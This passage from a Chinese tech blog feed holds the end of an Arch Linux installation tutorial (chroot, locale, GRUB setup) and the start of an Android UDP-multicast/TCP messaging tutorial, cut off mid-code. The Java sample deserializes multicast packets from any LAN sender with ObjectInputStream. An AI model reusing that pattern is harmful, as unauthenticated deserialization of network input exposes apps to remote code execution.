<p>由于这步比较重要，所以我们需要输出生成的文件来检查是否正确，执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat /mnt/etc/fstab</span><br></pre></td></tr></table></figure>
<p><img src="/images/arch10.jpg" alt=""></p>
<p>如图，可以看到<code>/dev/sda4</code>被挂载到了根分区。</p>
<p><code>/dev/sda3</code>是我之前存活下来的家目录被挂载到了<code>/home</code>目录（你们没有这条）。</p>
<p><strong>如果是<code>EFI/GPT</code>引导的还应该有引导分区被挂载到<code>/boot</code>目录</strong>。</p>
<h4 id="Chroot"><a href="#Chroot" class="headerlink" title="Chroot"></a>Chroot</h4><p><code>Chroot</code>意为<code>Change root</code>，相当于把操纵权交给我们新安装（或已经存在）的<code>Linux</code>系统，<strong>执行了这步以后，我们的操作都相当于在磁盘上新装的系统中进行</strong>。</p>
<p>执行如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arch-chroot /mnt</span><br></pre></td></tr></table></figure>
<hr>
<p>这里顺便说一下，如果以后我们的系统出现了问题，只要插入U盘并启动， 将我们的系统根分区挂载到了<code>/mnt</code>下（如果有<code>efi</code>分区也要挂载到<code>/mnt/boot</code>下），再通过这条命令就可以进入我们的系统进行修复操作。</p>
<hr>
<h4 id="设置时区"><a href="#设置时区" class="headerlink" title="设置时区"></a>设置时区</h4><p>依次执行如下命令设置我们的时区为上海并生成相关文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime</span><br><span class="line">hwclock --systohc</span><br></pre></td></tr></table></figure>
<p><img src="/images/arch11.jpg" alt=""></p>
<h4 id="提前安装必须软件包"><a href="#提前安装必须软件包" class="headerlink" title="提前安装必须软件包"></a>提前安装必须软件包</h4><p>因为我们现在已经<code>Chroot</code>到了新的系统中，只有一些最基本的包（组件），这时候我们就需要自己安装新的包了，下面就要介绍一下<code>ArchLinux</code>下非常强大的包管理工具<code>pacman</code>，大部分情况下，一行命令就可以搞定包与依赖的问题。</p>
<p>安装包的命令格式为<code>pacman -S 包名</code>，<code>pacman</code>会自动检查这个包所需要的其他包（即为依赖）并一起装上。下面我们就通过<code>pacman</code>来安装一些包，这些包在之后会用上，在这里先提前装好。</p>
<p>执行如下命令（注意大小写，大小写错误会导致包无法找到）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S vim dialog wpa_supplicant ntfs-3g networkmanager netctl</span><br></pre></td></tr></table></figure>
<p>一路确认之后包就被成功装上了。</p>
<p><img src="/images/arch12.jpg" alt=""></p>
<p>图中只安装了<code>Vim</code>和它的依赖。</p>
<h4 id="设置Locale"><a href="#设置Locale" class="headerlink" title="设置Locale"></a>设置Locale</h4><p>设置我们使用的语言选项，执行如下命令来编辑<code>/etc/locale.gen</code>文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/locale.gen</span><br></pre></td></tr></table></figure>
<p>在文件中找到<code>zh_CN.UTF-8 UTF-8</code> <code>zh_HK.UTF-8 UTF-8</code> <code>zh_TW.UTF-8 UTF-8</code> <code>en_US.UTF-8 UTF-8</code>这四行，去掉行首的#号，保存并退出。如图：</p>
<p><img src="/images/arch13.jpg" alt=""></p>
<p><img src="/images/arch14.jpg" alt=""></p>
<p>然后执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">locale-gen</span><br></pre></td></tr></table></figure>
<p><img src="/images/arch15.jpg" alt=""></p>
<p>打开（不存在时会创建）<code>/etc/locale.conf</code>文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/locale.conf</span><br></pre></td></tr></table></figure>
<p>在文件的第一行加入以下内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">LANG=en_US.UTF-8</span><br></pre></td></tr></table></figure>
<p>保存并退出。</p>
<h4 id="设置主机名"><a href="#设置主机名" class="headerlink" title="设置主机名"></a>设置主机名</h4><p>打开（不存在时会创建）<code>/etc/hostname</code>文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/hostname</span><br></pre></td></tr></table></figure>
<p>在文件的第一行输入你自己设定的一个<code>myhostname</code></p>
<p>保存并退出。</p>
<p>编辑<code>/etc/hosts</code>文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure>
<p>在文件末添加如下内容（将<code>myhostname</code>替换成你自己设定的主机名）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1	localhost</span><br><span class="line">::1		localhost</span><br><span class="line">127.0.1.1	myhostname.localdomain	myhostname</span><br></pre></td></tr></table></figure>
<p><img src="/images/arch16.png" alt=""></p>
<p>这里我设置的是<code>viseator</code>。</p>
<p>保存并退出。</p>
<h4 id="设置Root密码"><a href="#设置Root密码" class="headerlink" title="设置Root密码"></a>设置Root密码</h4><p><code>Root</code>是<code>Linux</code>中具有最高权限帐户，有些敏感的操作必须通过<code>Root</code>用户进行，比如使用<code>pacman</code>，我们之前进行所有的操作也都是以<code>Root</code>用户进行的，也正是因为<code>Root</code>的权限过高，如果使用不当会造成安全问题，所以我们之后会新建一个普通用户来进行日常的操作。在这里我们需要为<code>Root</code>帐户设置一个密码：</p>
<p>执行如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">passwd</span><br></pre></td></tr></table></figure>
<p>按提示设置并确认就可以了。</p>
<p><img src="/images/arch17.jpg" alt=""></p>
<hr>
<p>或许有的人已经发现官方Wiki和一些其他教程资料中的命令是以<code>#</code>或<code>$</code>开头的，这两个符号就对应着命令行中的命令提示符，<code>#</code>代表以<code>Root</code>用户执行命令，<code>$</code>代表以普通用户执行命令，平时使用教程中的命令时应该注意这一点。</p>
<hr>
<h4 id="安装Intel-ucode（非IntelCPU可以跳过此步骤）"><a href="#安装Intel-ucode（非IntelCPU可以跳过此步骤）" class="headerlink" title="安装Intel-ucode（非IntelCPU可以跳过此步骤）"></a>安装<code>Intel-ucode</code>（非<code>Intel</code>CPU可以跳过此步骤）</h4><p>直接<code>pacman</code>安装：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S intel-ucode</span><br></pre></td></tr></table></figure>
<h4 id="安装Bootloader"><a href="#安装Bootloader" class="headerlink" title="安装Bootloader"></a>安装<code>Bootloader</code></h4><p>经常听说很多人因为引导问题导致系统安装失败，多数是因为教程没有统一或是过时的教程引起的，这里只要按照步骤来其实是不难的。</p>
<p>这里我们安装最流行的<code>Grub2</code>。<strong>（如果曾经装过<code>Linux</code>，记得删掉原来的<code>Grub</code>，否则不可能成功启动）</strong></p>
<ul>
<li><p>首先安装<code>os-prober</code>和<code>ntfs-3g</code>这两个包，它可以配合<code>Grub</code>检测已经存在的系统，自动设置启动选项。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S os-prober ntfs-3g</span><br></pre></td></tr></table></figure>
</li>
</ul>
<hr>
<h5 id="如果为BIOS-MBR引导方式："><a href="#如果为BIOS-MBR引导方式：" class="headerlink" title="如果为BIOS/MBR引导方式："></a><strong>如果为BIOS/MBR引导方式：</strong></h5><ul>
<li><p>安装<code>grub</code>包：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S grub</span><br></pre></td></tr></table></figure>
</li>
<li><p>部署<code>grub</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grub-install --target=i386-pc /dev/sdx （将sdx换成你安装的硬盘）</span><br></pre></td></tr></table></figure>
<p>注意这里的<code>sdx</code>应该为硬盘（例如<code>/dev/sda</code>），<strong>而不是</strong>形如<code>/dev/sda1</code>这样的分区。</p>
</li>
<li><p>生成配置文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grub-mkconfig -o /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="/images/arch18.jpg" alt=""></p>
<p><strong>如果你没有看到如图所示的提示信息，请仔细检查是否正确完成上面的过程。常见问题如下：</strong></p>
<ol>
<li><p>如果报<code>warning failed to connect to lvmetad，falling back to device scanning.</code>错误。参照<a href="https://wiki.archlinux.org/index.php/Install_from_existing_Linux" target="_blank" rel="noopener">wiki</a>中搜索关键词<code>use_lvmetad</code>所在位置，简单的方法是编辑<code>/etc/lvm/lvm.conf</code>这个文件，找到<code>use_lvmetad = 1</code>将<code>1</code>修改为<code>0</code>，保存，重新配置grub。</p>
</li>
<li><p>有部分同学反馈后面安装<code>grub</code>包的时候报如下错误：</p>
<p><img src="/images/arch25.png" alt=""></p>
<p>是因为实际是<code>UEFI</code>引导的系统没有正确挂载<code>boot</code>分区。首先检查你是不是按照<code>BIOS</code>方式安装的系统，二是检查是否正确挂载<code>/mnt/boot</code>。正确配置好<code>boot</code>分区之后可以从“挂载分区”这步开始重做。</p>
</li>
</ol>
<hr>
<h5 id="如果为EFI-GPT引导方式："><a href="#如果为EFI-GPT引导方式：" class="headerlink" title="如果为EFI/GPT引导方式："></a><strong>如果为EFI/GPT引导方式：</strong></h5><ul>
<li><p>安装<code>grub</code>与<code>efibootmgr</code>两个包：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S grub efibootmgr</span><br></pre></td></tr></table></figure>
</li>
<li><p>部署<code>grub</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grub-install --target=x86_64-efi --efi-directory=/boot --bootloader-id=grub</span><br></pre></td></tr></table></figure>
</li>
<li><p>生成配置文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grub-mkconfig -o /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p><strong>提示信息应与上面的图类似，如果你发现错误，请仔细检查是否正确完成上面的过程。</strong></p>
<p>如果报<code>warning failed to connect to lvmetad，falling back to device scanning.</code>错误。参照<a href="https://www.pckr.co.uk/arch-grub-mkconfig-lvmetad-failures-inside-chroot-install/" target="_blank" rel="noopener">这篇文章</a>，简单的方法是编辑<code>/etc/lvm/lvm.conf</code>这个文件，找到<code>use_lvmetad = 1</code>将<code>1</code>修改为<code>0</code>，保存，重新配置grub。</p>
<p>如果报<code>grub-probe: error: cannot find a GRUB drive for /dev/sdb1, check your device.map</code>类似错误，并且<code>sdb1</code>这个地方是你的u盘，这是u盘<code>uefi</code>分区造成的错误，对我们的正常安装没有影响，可以不用理会这条错误。</p>
<hr>
<h5 id="安装后检查"><a href="#安装后检查" class="headerlink" title="安装后检查"></a>安装后检查</h5><p><strong>如果你是多系统，请注意上面一节中对<code>os-prober</code>这个包的安装。</strong></p>
<p><strong>强烈建议使用如下命令检查是否成功生成各系统的入口，如果没有正常生成会出现开机没有系统入口的情况：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure>
<p>检查接近末尾的<code>menuentry</code>部分是否有<code>windows</code>或其他系统名入口。下图例子中是<code>Arch Linux</code>入口与检测到的<code>windows10</code>入口（安装在<code>/dev/sda1</code>），具体情况可能有不同：</p>
<p><img src="/images/arch22.jpg" alt=""></p>
<p><strong>如果你没有看到<code>Arch Linux</code>系统入口或者该文件不存在</strong>，请先检查<code>/boot</code>目录是否正确部署<code>linux</code>内核：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /boot</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
<p>查看是否有<code>initramfs-linux-fallback.img  initramfs-linux.img  intel-ucode.img  vmlinuz-linux</code>这几个文件，如果都没有，说明<code>linux</code>内核没有被正确部署，很有可能是<code>/boot</code>目录没有被正确挂载导致的，确认<code>/boot</code>目录无误后，可以重新部署<code>linux</code>内核：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pacman -S linux</span><br></pre></td></tr></table></figure>
<p>再重新生成配置文件，就可以找到系统入口。</p>
<p><strong>如果你已经安装<code>os-prober</code>包并生成配置文件后还是没有生成其他系统的入口</strong>：</p>
<p><strong>你目前处的U盘安装环境下有可能无法检测到其他系统的入口，请在下一步中重启登陆之后重新运行</strong>：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grub-mkconfig -o /boot/grub/grub.cfg</span><br></pre></td></tr></table></figure></p>
<p>如果还没有生成其他系统的入口，请参照：</p>
<blockquote>
<p>  <a href="https://wiki.archlinux.org/index.php/GRUB/Tips_and_tricks#Combining_the_use_of_UUIDs_and_basic_scripting" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/GRUB/Tips_and_tricks#Combining_the_use_of_UUIDs_and_basic_scripting</a> </p>
</blockquote>
<p>编辑配置文件手动添加引导的分区入口。</p>
<hr>
<h5 id="重启"><a href="#重启" class="headerlink" title="重启"></a>重启</h5><p>接下来，你需要进行重启来启动已经安装好的系统，执行如下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exit</span></span><br></pre></td></tr></table></figure>
<p><strong> 如果挂载了<code>/mnt/boot</code>，先<code>umount /mnt/boot</code>，再<code>umount /mnt</code>，否则直接<code>umount /mnt</code>：</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">umount /mnt/boot</span><br><span class="line">umount /mnt</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure></p>
<p>注意这个时候你可能会卡在有两行提示的地方无法正常关机，长按电源键强制关机即可，没有影响。</p>
<p>关机后拔出U盘，启动顺序会自动以硬盘启动，如果一切顺利，那么你将会看到下面的界面：</p>
<p><img src="/images/arch19.jpg" alt=""></p>
<p>启动时有可能会有输出信息显示在这里，直接回车就可以了。</p>
<p>输入<code>root</code>，再输入之前设置的密码，显示出命令提示符，恭喜你，你已经成功安装<code>ArchLinux</code>！</p>
<h2 id="安装后配置"><a href="#安装后配置" class="headerlink" title="安装后配置"></a>安装后配置</h2><p>虽然系统安装好了，但是还没有进行基本配置和安装图形界面，所以接下来我们要进行一些必须的配置和图形界面的安装。</p>
<p>请见下一篇文章：<a href="http://www.viseator.com/2017/05/19/arch_setup/">ArchLinux安装后的必须配置与图形界面安装教程</a></p>
<h2 id="特别感谢"><a href="#特别感谢" class="headerlink" title="特别感谢"></a>特别感谢</h2><p>评论区中<code>Senrey_Song</code>、<code>YKun</code>、<code>imzhwk</code>、<code>haonan mao</code>、<code>Lichen Zhang</code>、<code>回风</code>、<code>Nee</code>、<code>Wafer</code>、<code>LIU SHIKE</code>、<code>Charles</code>、<code>MegatonZed</code>、<code>beer!code!</code>、<code>禾七</code>、<code>Unira</code>、<code>arc</code>、<code>ZhiChao Li</code>、<code>多听音乐多喝水</code>、<code>AirLongdian</code>对于本教程内容的宝贵建议与指正。</p>
<p><code>leccesg</code>、<code>Sophie Spivey</code>、<code>竹林里有冰</code>、<code>王心语</code>通过邮件提供的宝贵建议。</p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>如果觉得这篇教程对你有帮助，可以移步我的知乎回答下点个赞，让更多的人可以看到这篇教程，你的支持是我最大的动力：</p>
<blockquote>
<p>  Arch Linux 怎么安装？ - viseator的回答 - 知乎<br>  <a href="https://www.zhihu.com/question/21427410/answer/171867330" target="_blank" rel="noopener">https://www.zhihu.com/question/21427410/answer/171867330</a></p>
</blockquote>
<p><strong>同时，如果你是想要从事计算机方向的新人，非常推荐看看我的分享：</strong>：</p>
<p><a href="https://www.viseator.com/2020/05/24/university_1/">从开始到微信/支付宝/Airbnb/抖音Offer——我的大学客户端开发学习之路（一）开始——步入大学生活</a></p>
<p>也欢迎关注我的微信公众号VirMe：<br><img src="/images/wechat_channel.jpg" alt=""></p>
<p>如果安装过程中遇到问题，可以直接在下方评论区/公众号留言或邮件<a href="mailto:viseator@gmail.com">viseator@gmail.com</a>（尽量附上错误信息），我会尽力回复解决。</p>
]]></content>
      <categories>
        <category>Linux</category>
        <category>Arch</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Arch</tag>
      </tags>
  </entry>
  <entry>
    <title>Android利用UDP、TCP进行局域网数据传输</title>
    <url>/2017/05/11/android_lan_messages/</url>
    <content><![CDATA[<h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>在团队内部的hackweek中实现了一个在局域网环境中（同一个wifi下）进行的卡片收发小游戏，踩了一些关于局域网内通信的坑，这篇博文就用来整理一下整个过程的思路，<a href="https://github.com/viseator/AnonymousCard" target="_blank" rel="noopener">完整代码地址</a>。</p>
<h2 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h2><p>在整个过程中利用到了UDP与TCP两种传输层协议，两者的特性决定了使用上的不同。</p>
<p>简单地说，UDP非面向连接，不需要先与目标建立连接，所以UDP不提供可靠的数据传输，也不能保证数据准确无误地到达目的地，但UDP的优势在于它可以迅速传送大量信息，传输性能比较好。</p>
<p>而TCP是面向连接的协议，需要经过三次握手与目的地址建立一个稳定的连接，可以保证数据准确、完整地到达。但是它的传输效率就没有UDP那么高。</p>
<p>首先，为了数据传输的稳定和准确性，在传送主要数据部分我们必需使用TCP来建立一个点对点的稳定的连接来传输主要数据。</p>
<a id="more"></a>
<p>但是，为了建立一个TCP连接，请求的一方必须要知道被请求一方（下面简称服务方）的IP地址。而在局域网中，如果我们想要实现每个人连接局域网以后马上可以收发信息，由于每次加入时分配到的IP地址并不是固定的也无法提前得知，所以我们需要使用其他的办法先获取到服务方的IP地址。</p>
<p>这时就要利用到UDP协议的组播特性了，组播可以让设备都加入一个预设好的组，然后就可以向这个组中发送数据包，只要加入了这个组的设备都可以收到这个数据包。这样只要所有的设备都提前加入了同一个组，不需要互相知道IP地址就可以交换数据，那么我们应该如何利用这样的特性呢？</p>
<p>结合我们的实际需求，游戏过程是每个人可以向所有人发送一个只有标题的匿名卡片（这个过程就符合UDP组播的特性），如果感兴趣的人就可以点击收到的卡片来打开这个卡片查看具体内容（这个过程就需要我们建立TCP连接来传输数据）。</p>
<p>所以我们就有了思路，向所有人发送卡片的过程使用UDP进行组播，数据包中除了包含标题信息还要包含一个发送人的IP地址以及一个Mac地址作为ID（考虑到重新连接后地址发生改变的问题），当所有人收到这个卡片以后需要建立连接的时候就可以得到发送人的IP来进行TCP连接。</p>
<p>下面我们来实现这个过程。</p>
<h2 id="具体实现"><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h2><h3 id="组播"><a href="#组播" class="headerlink" title="组播"></a>组播</h3><p>我们定义一个<code>ComUtil</code>类来处理组播</p>
<h4 id="加入组"><a href="#加入组" class="headerlink" title="加入组"></a>加入组</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String CHARSET = <span class="string">"utf-8"</span>;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String BROADCAST_IP = <span class="string">"224.0.1.2"</span>; <span class="comment">//IP协议中特殊IP地址，作为一个组，用来集合加入的所有客户端</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> BROADCAST_PORT = <span class="number">7816</span>; <span class="comment">//广播目的端的端口号</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DATA_LEN = <span class="number">4096</span>;</span><br><span class="line"><span class="keyword">private</span> MulticastSocket socket = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">private</span> InetAddress broadcastAddress = <span class="keyword">null</span>;<span class="comment">//当前设备在局域网下的IP地址</span></span><br><span class="line"><span class="keyword">byte</span>[] inBuff = <span class="keyword">new</span> <span class="keyword">byte</span>[DATA_LEN];</span><br><span class="line"><span class="keyword">private</span> DatagramPacket inPacket = <span class="keyword">new</span> DatagramPacket(inBuff, inBuff.length);<span class="comment">//用于接受对象的packet</span></span><br><span class="line"><span class="keyword">private</span> DatagramPacket outPacket = <span class="keyword">null</span>;<span class="comment">//用于发送对象的packet</span></span><br><span class="line"><span class="keyword">private</span> Handler handler;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">ComUtil</span><span class="params">(Handler handler)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.handler = handler;<span class="comment">//回调使用Handler机制</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startReceiveMsg</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        socket = <span class="keyword">new</span> MulticastSocket(BROADCAST_PORT);<span class="comment">//打开一个组播Socket</span></span><br><span class="line">        broadcastAddress = InetAddress.getByName(BROADCAST_IP);<span class="comment">//需要进行一步转换来使用String类型的IP地址</span></span><br><span class="line">        socket.joinGroup(broadcastAddress);<span class="comment">//加入一个组</span></span><br><span class="line">        outPacket = <span class="keyword">new</span> DatagramPacket(<span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">0</span>], <span class="number">0</span>, broadcastAddress, BROADCAST_PORT);<span class="comment">//用于发送数据包的DatagramPacket</span></span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">//下面两行用于下文中的开始接收广播</span></span><br><span class="line">    Thread thread = <span class="keyword">new</span> Thread(<span class="keyword">new</span> ReadBroad());</span><br><span class="line">    thread.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注释应该讲得比较清楚了，这里要注意的是UDP数据的收发需要使用一个<code>DatagramPacket</code>来进行。可以理解为一个数据包。</p>
<h4 id="接收组播信息"><a href="#接收组播信息" class="headerlink" title="接收组播信息"></a>接收组播信息</h4><p>上面的代码最后两行新建了一个线程用于接收组播信息，具体代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReadBroad</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                socket.receive(inPacket);</span><br><span class="line">                Message message = <span class="keyword">new</span> Message();</span><br><span class="line">                message.what = BROADCAST_PORT;</span><br><span class="line">                message.obj = inBuff;</span><br><span class="line">                handler.sendMessage(message);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>进行了一个无限循环，进行到第5行时如果没有收到广播的<code>DatagramPacket</code>会一直处于阻塞状态，收到一个<code>DatagramPacket</code>后就会通过<code>Handler</code>来转发出去，在<code>Handler</code>所在线程来处理这个数据包。之后再进行循环不断地接收并处理数据包。</p>
<h4 id="发送组播信息"><a href="#发送组播信息" class="headerlink" title="发送组播信息"></a>发送组播信息</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">broadCast</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] msg)</span> </span>&#123;</span><br><span class="line">    Thread thread = <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                outPacket.setData(msg); <span class="comment">//数据来源为外部，类型是二进制数据</span></span><br><span class="line">                socket.send(outPacket);<span class="comment">//向组中发送该数据包</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">                ex.printStackTrace();</span><br><span class="line">                <span class="keyword">if</span> (socket != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    socket.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    thread.start();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个方法由外部调用，传入一个二进制数组数据通过<code>setData()</code>放在数据包中向组中的所有成员发送。成员通过上一节的接收方法接收到的就会是同样的数据包。</p>
<h3 id="数据处理"><a href="#数据处理" class="headerlink" title="数据处理"></a>数据处理</h3><p>建立了组播的工具，下一步就要建立一个数据对象来进行信息的交换。由于数据包中的数据只能是以字节码的形式存在，所以我们设计的数据对象一定要是可序列化的（也就是实现了<code>Serializable</code>接口的），再通过流工具进行转换。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UDPDataPackage</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String ipAddress;</span><br><span class="line">    <span class="keyword">private</span> String macAddress;</span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line">    <span class="keyword">private</span> String id;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这个简单的JavaBean中只定义了四个简单数据。</p>
<p>我们将自己的信息设置后就可以通过如下方法转换成一个字节数组再通过上面的广播方法来发送：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">comUtil.broadCast(ConvertData.objectToByte(<span class="keyword">new</span> UDPDataPackage(...))); <span class="comment">//发送数据</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过流来进行的序列化</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] objectToByte(Object object) &#123;</span><br><span class="line">    ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    ObjectOutputStream outputStream;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        outputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        outputStream.writeObject(object);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> byteArrayOutputStream.toByteArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>同样的，在接收到数据以后可以反序列化来得到原对象：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">byteToObject</span><span class="params">(<span class="keyword">byte</span>[] bytes)</span> </span>&#123;</span><br><span class="line">    ByteArrayInputStream byteInputStream = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">    Object object = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(byteInputStream);</span><br><span class="line">        object = objectInputStream.readObject();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样，我们就可以从这个对象中获取想到的IP地址等信息了。</p>
<h3 id="建立TCP连接传输数据"><a href="#建立TCP连接传输数据" class="headerlink" title="建立TCP连接传输数据"></a>建立TCP连接传输数据</h3><p>想要建立TCP连接，需要客户端与服务端两端的配合，我们现在已经获取到了需要建立连接的IP地址，下面我们要做的是与这个地址的服务端建立连接再传输数据。服务端需要一直运行来随时准备接受可能的请求。</p>
<p>由于我们同一个设备既要作为客户端，也要作为服务端，所以要编写两个类。</p>
<h4 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startServer</span><span class="params">(Handler handler)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.handler = handler;<span class="comment">//利用handler进行处理</span></span><br><span class="line">    thread = <span class="keyword">new</span> Thread(<span class="keyword">new</span> RunServer());</span><br><span class="line">    thread.start();<span class="comment">//另开一个线程接收连接请求</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RunServer</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ServerSocket serverSocket = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            serverSocket = <span class="keyword">new</span> ServerSocket();<span class="comment">//初始化一个ServerSocket</span></span><br><span class="line">            serverSocket.setReuseAddress(<span class="keyword">true</span>);</span><br><span class="line">            serverSocket.bind(<span class="keyword">new</span> InetSocketAddress(SERVER_PORT));<span class="comment">//与端口绑定</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> 